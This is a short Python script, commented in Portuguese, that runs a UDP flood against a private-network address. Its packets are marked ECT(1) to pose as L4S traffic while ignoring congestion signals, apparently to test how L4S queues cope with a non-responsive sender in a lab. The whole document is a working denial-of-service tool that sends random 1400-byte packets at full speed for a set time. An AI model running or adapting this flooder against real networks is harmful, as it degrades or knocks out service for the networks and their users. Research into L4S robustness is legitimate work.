import socket
import time
import argparse
import random
import sys

# Configurações do Alvo (Server L4S) e Rede
TARGET_IP = "192.168.57.10"
TARGET_PORT = 5050 # Porta aleatória, o iperf geralmente usa 5201, mas vamos flodar a rede
PACKET_SIZE = 1400 # Tamanho próximo ao MTU para saturar
DURATION = 60      # Duração do ataque em segundos

def start_attack(target_ip, port, duration):
    # Criação do Socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # --- A MÁGICA DO ATAQUE L4S ---
    # IP_TOS (Type of Service). 
    # ECT(1) é o valor 1 (01 em binário nos ultimos 2 bits).
    # Em hex, define-se o byte. Vamos usar 0x01 para setar ECT(1).
    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x01)
        print(f"[!] Socket configurado com TOS 0x01 (ECN Capable - ECT1)")
    except Exception as e:
        print(f"[ERROR] Falha ao setar TOS: {e}")

    # Gera payload aleatório
    bytes_payload = random._urandom(PACKET_SIZE)
    
    print(f"[*] Iniciando UDP Flood L4S Fake em {target_ip}:{port}")
    print(f"[*] Duração: {duration} segundos")
    print(f"[*] Comportamento: Ignorando marcas CE (Non-Responsive)")

    timeout = time.time() + duration
    sent_packets = 0

    try:
        while time.time() < timeout:
            sock.sendto(bytes_payload, (target_ip, port))
            sent_packets += 1
            
            # Opcional: Pequeno sleep se quiser controlar a taxa (ex: 100Mbps)
            # Mas para ataque de saturação, deixamos sem sleep (Full Speed)
            # time.sleep(0.0001) 

    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário.")
    
    print(f"[*] Ataque finalizado. Pacotes enviados: {sent_packets}")
    sock.close()

if __name__ == "__main__":
    start_attack(TARGET_IP, TARGET_PORT, DURATION)